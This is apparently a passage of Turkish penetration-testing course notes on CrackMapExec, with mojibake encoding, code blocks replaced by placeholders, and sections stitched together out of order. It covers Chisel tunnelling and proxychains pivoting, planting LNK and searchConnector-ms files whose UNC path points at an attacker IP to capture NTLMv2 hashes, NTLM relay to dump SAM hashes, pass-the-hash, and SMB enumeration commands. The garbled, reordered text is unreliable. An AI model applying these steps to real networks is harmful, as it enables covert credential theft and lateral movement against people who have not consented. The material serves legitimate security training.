{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'print

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


### Slinky ModÃ¼lÃ¼

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafÄ±ndan oluÅŸturulan bir modÃ¼ldÃ¼r ve CME'deki en heyecan verici modÃ¼llerden biridir. Prensip basittir. ModÃ¼l, yazma izinlerine sahip tÃ¼m paylaÅŸÄ±mlarda belirtilen SMB sunucusuna bir UNC yolu iÃ§eren simge attribute'a sahip Windows kÄ±sayollarÄ± oluÅŸturur. Birisi paylaÅŸÄ±mÄ± ziyaret ettiÄŸinde, simge attribute'u sunucumuza giden bir UNC yolu iÃ§erdiÄŸi iÃ§in `Responder` kullanarak NTLMv2 hash'ini alacaÄŸÄ±z.

ModÃ¼lÃ¼n `SERVER` ve `NAME` olmak Ã¼zere iki zorunlu seÃ§eneÄŸi ve bir isteÄŸe baÄŸlÄ± `CLEANUP` seÃ§eneÄŸi vardÄ±r.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiÄŸimiz SMB sunucusunun IP'sine ve UNC yolunun iÅŸaret etmesini istediÄŸimiz yere karÅŸÄ±lÄ±k gelir. `NAME` seÃ§eneÄŸi kÄ±sayol dosyasÄ±na bir isim atar, `CLEANUP` ise iÅŸimiz bittiÄŸinde kÄ±sayolu silmek iÃ§indir.


### Chisel kullanarak baÄŸlama

Bu alÄ±ÅŸtÄ±rma iÃ§in lokal eriÅŸimi simÃ¼le edeceÄŸiz ve internal aÄŸa baÄŸlanmak iÃ§in Chisel ve Proxychains kullanacaÄŸÄ±z. Chisel zaten hedef makinemizde bir sunucu olarak Ã§alÄ±ÅŸÄ±yor ve bir client olarak baÄŸlanmamÄ±z ve daha sonra internal aÄŸÄ± numaralandÄ±rmak iÃ§in proxychains kullanmamÄ±z gerekiyor. Chisel kullanarak baÄŸlanmak iÃ§in aÅŸaÄŸÄ±daki komutu **kullanalÄ±m**


### Hedef Makine Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Ã‡alÄ±nmasÄ±
Ä°lk olarak, `--shares` seÃ§eneÄŸini kullanarak `grace` kullanÄ±cÄ±sÄ±nÄ±n `WRITE` ayrÄ±calÄ±klarÄ±na sahip olduÄŸu bir paylaÅŸÄ±m bulalÄ±m:

### WRITE AyrÄ±calÄ±klarÄ±na Sahip PaylaÅŸÄ±mlarÄ± Bulma

{{CODE_BLOCK_114}}


GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `grace` `HR` ve `IT-Tools` paylaÅŸÄ±mlarÄ±na yazabilir. Bu nedenle her bir paylaÅŸÄ±ma bir `LNK` dosyasÄ± yazmak iÃ§in `Slinky` modÃ¼lÃ¼nÃ¼ kullanabiliriz. 

**SERVER=10.10.14.33** seÃ§eneÄŸini kullanarak **attack host**'umuzun **tun0** aÄŸÄ±ndaki **IP adresini** belirteceÄŸiz ve **NAME=important** seÃ§eneÄŸiyle **LNK dosyasÄ±na atanacak dosya adÄ±nÄ±** belirleyeceÄŸiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` aÃ§Ä±sÄ±ndan gÃ¼venli** olarak kabul edilir Ã§Ã¼nkÃ¼ tÃ¼m iÅŸlemler ya **`bellekte` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r**, ya **`WinAPI` Ã§aÄŸrÄ±larÄ±yla aÄŸ Ã¼zerinden sorgulanÄ±r**, ya da **Windows'un built-in araÃ§larÄ±/Ã¶zellikleri** kullanÄ±larak gerÃ§ekleÅŸtirilir.

Bu gereksinimleri karÅŸÄ±lamayan bir modÃ¼l Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±mÄ±zda, **Ã¶nceden bir uyarÄ± alÄ±rÄ±z**. **`Slinky`** modÃ¼lÃ¼, **OpSec aÃ§Ä±sÄ±ndan gÃ¼venli olmayan** bir modÃ¼le Ã¶rnektir. Devam etmeden Ã¶nce **bir uyarÄ± alacaÄŸÄ±z**.

LNK dosyasÄ± oluÅŸturulduktan sonra, Responder'Ä± Ã§alÄ±ÅŸtÄ±rmamÄ±z ve birinin paylaÅŸÄ±ma gÃ¶z atmasÄ±nÄ± beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak iÃ§in `Responder.conf` dosyasÄ±nda SMB seÃ§eneÄŸi `On` olmalÄ±dÄ±r.

NTLMv2 hash'imizi aldÄ±k ve hesabÄ± kullanmak iÃ§in onu kÄ±rmamÄ±z gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kÄ±rmak iÃ§in, `ASREPRoast` ve `Kerberoasting` ile yaptÄ±ÄŸÄ±mÄ±z gibi `Hashcat mod 5600`'Ã¼ kullanabiliriz. `NTLM Relay`'e odaklanalÄ±m.


### **NTLM Relay**

DiÄŸer bir Ã§Ã¶zÃ¼m ise NTLMv2 hash'ini doÄŸrudan `SMB Sign`'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± aÄŸdaki diÄŸer sunuculara ve workstation'lara iletmektir. SMB Sign Ã§ok Ã¶nemlidir Ã§Ã¼nkÃ¼ bir bilgisayarda SMB Sign etkinse, saldÄ±rÄ± hostumuzun kimliÄŸini kanÄ±tlayamayacaÄŸÄ±mÄ±z iÃ§in o bilgisayara relay yapamayÄ±z. SMB Sign'nÄ±n devre dÄ±ÅŸÄ± bÄ±rakÄ±ldÄ±ÄŸÄ± hedeflerin bir listesini almak iÃ§in `--gen-relay-list` seÃ§eneÄŸini kullanabiliriz.

Åimdi Proxychains'i kullanabilir ve SMB Sign devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸ makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracÄ±nÄ±, daha Ã¶nce **`--gen-relay-list`** seÃ§eneÄŸiyle elde ettiÄŸimiz listeyle birlikte kullanacaÄŸÄ±z.

Hedef makinede **local administrator** ayrÄ±calÄ±klarÄ±na sahip bir hesap bulursak ve ek seÃ§enekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanÄ±cÄ±sÄ±nÄ±n hash'leriyle** bir **`pass-the-hash attack`** gerÃ§ekleÅŸtirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanÄ±cÄ±nÄ±n **SMB share**'ine eriÅŸmesini beklemeliyiz. **LNK dosyamÄ±z**, kullanÄ±cÄ±nÄ±n hedef makinemize baÄŸlanmasÄ±nÄ± zorlar (**bu iÅŸlem arka planda gerÃ§ekleÅŸir ve kullanÄ±cÄ± herhangi bir anormallik fark etmez**).

Bu gerÃ§ekleÅŸtiÄŸinde, **`ntlmrelayx`** konsolunda aÅŸaÄŸÄ±dakine benzer bir Ã§Ä±ktÄ± gÃ¶rmeliyiz:

{{CODE_BLOCK_119}}

ArdÄ±ndan, administrator hash'ini kullanarak hedef makinede kimlik doÄŸrulamasÄ± yapmak iÃ§in crackmapexec'i kullanabiliriz:

### Local HesaplarÄ± Test Etme

{{CODE_BLOCK_120}}

### Her Åeyi Temizleyin

ModÃ¼lÃ¼ kullandÄ±ktan sonra, **LNK dosyasÄ±nÄ± temizlemek** iÃ§in **`-o CLEANUP=YES`** seÃ§eneÄŸini ve **LNK dosyasÄ±nÄ±n adÄ±nÄ±** (**`NAME=important`**) belirtmek kritik Ã¶nem taÅŸÄ±r.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc ModÃ¼lÃ¼ ile Hash'lerin Ã‡alÄ±nmasÄ±

Bu bÃ¶lÃ¼mÃ¼ tamamlamadan Ã¶nce, **LNK** dÄ±ÅŸÄ±nda baÅŸka bir dosya formatÄ± kullanarak kimlik doÄŸrulamasÄ±nÄ± zorlamanÄ±n baÅŸka bir yÃ¶ntemine bakalÄ±m: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatlarÄ±. Bu dosya formatlarÄ±nÄ±n Ã§oÄŸu Windows sÃ¼rÃ¼mÃ¼nde **varsayÄ±lan dosya iliÅŸkilendirmeleri** bulunur. Windows ile entegre Ã§alÄ±ÅŸarak iÃ§eriÄŸi rastgele bir konumdan, hatta **`WebDAV` paylaÅŸÄ±mÄ±yla belirtilen remote bir konumdan** gÃ¶sterebilirler.

Ã–zetle, bu dosyalar **LNK** dosyasÄ±yla aynÄ± iÅŸlevi gÃ¶rÃ¼r. Bu yÃ¶ntemin keÅŸfi hakkÄ±nda daha fazla bilgi edinmek iÃ§in **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** baÅŸlÄ±klÄ± blog yazÄ±sÄ±nÄ± okuyabiliriz.

CrackMapExec, **`drop-sc`** adÄ±nda bir modÃ¼le sahiptir. Bu modÃ¼l, paylaÅŸÄ±lan bir klasÃ¶rde **`searchConnector-ms`** dosyasÄ± oluÅŸturmamÄ±za olanak tanÄ±r. Kullanabilmek iÃ§in **URL** seÃ§eneÄŸini belirterek **SMB fake sunucumuzu** hedef gÃ¶stermemiz gerekir. Bu durumda, **`ntlmrelayx`** Ã§alÄ±ÅŸtÄ±ran hostumuz olacaktÄ±r. **URL** deÄŸeri Ã§ift ters eÄŸik Ã§izgi (`\`) ile kaÃ§Ä±rÄ±lmalÄ±dÄ±r. Ã–rneÄŸin: **`URL=\\10.10.14.33\secret`**.

Ä°steÄŸe baÄŸlÄ± olarak aÅŸaÄŸÄ±daki seÃ§enekleri belirleyebiliriz:

* `SHARE=name` seÃ§eneÄŸi ile hedef paylaÅŸÄ±mlÄ± klasÃ¶r . Bu seÃ§eneÄŸi belirtmezsek, dosyayÄ± `WRITE` izinlerine sahip tÃ¼m paylaÅŸÄ±mlara yazacaktÄ±r

* `FILENAME=name` seÃ§eneÄŸi ile dosya adÄ± . Bu seÃ§eneÄŸi belirtmezsek, â€œ`Documents`â€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.

* OluÅŸturduÄŸumuz dosyalarÄ± temizlemek istiyorsak `CLEANUP=True` seÃ§eneÄŸi. EÄŸer Ã¶zel bir isim kullanacaksak filename seÃ§eneÄŸini belirtmemiz gerekiyor.

Drop-sc'yi iÅŸ baÅŸÄ±nda gÃ¶relim:

### Dropping a searchConnector-ms File

{{CODE_BLOCK_122}}

{{CODE_BLOCK_123}}

Bir kullanÄ±cÄ± **paylaÅŸÄ±lan klasÃ¶re** eriÅŸtiÄŸinde ve **ntlmrelayx** dinleme modunda Ã§alÄ±ÅŸÄ±rken, kimlik bilgilerini **hedef makineye yÃ¶nlendirebilmemiz** gerekir.

### NTLMRelayx ve drop-sc Kullanarak YÃ¶nlendirme

{{CODE_BLOCK_124}}

Son olarak, `CLEANUP=True` seÃ§eneÄŸi ile `.searchConnector-ms` dosyasÄ±nÄ± temizleyebiliriz:


### searchConnector-ms DosyalarÄ±nÄ± Temizleme

{{CODE_BLOCK_125}}


LNK dosyalarÄ± genellikle bu tÃ¼r saldÄ±rÄ±lar iÃ§in bilinir. `.searchConnector-ms` gibi baÅŸka bir dosya tÃ¼rÃ¼ kullanmak, fark edilmemenize yardÄ±mcÄ± olabilir.

Sonraki bÃ¶lÃ¼mlerde CrackMapExec'in keÅŸif seÃ§eneklerini inceleyeceÄŸiz.

---


### SMB ile Mapping ve Enumeration

CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

